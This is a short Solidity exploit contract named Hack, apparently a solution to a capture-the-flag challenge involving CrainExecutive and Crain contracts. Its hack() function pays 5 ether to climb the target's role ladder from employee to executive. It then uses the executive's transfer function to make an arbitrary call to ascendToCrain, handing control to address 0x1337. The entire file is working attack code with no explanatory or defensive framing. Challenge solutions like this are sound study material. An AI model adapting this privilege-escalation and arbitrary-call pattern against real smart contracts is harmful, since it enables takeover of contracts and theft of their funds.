pragma solidity ^0.8.0;

import "./CrainExecutive.sol";
import "./Crain.sol";

contract Hack {
    CrainExecutive public crainExe;
    Crain public crain;

    constructor(address _crainexe, address payable _crain) payable {
        crainExe = CrainExecutive(_crainexe);
        crain = Crain(_crain);
    }

    function hack() public payable {
        require(msg.value > 5 ether, "Need atleast 5 Ether");

        crainExe.becomeEmployee();
        crainExe.buyCredit{value: 5 ether}();
        crainExe.becomeManager();
        crainExe.becomeExecutive();

        crainExe.transfer(
            address(crain),
            0,
            abi.encodeWithSignature("ascendToCrain(address)", address(0x1337))
        );
    }
}
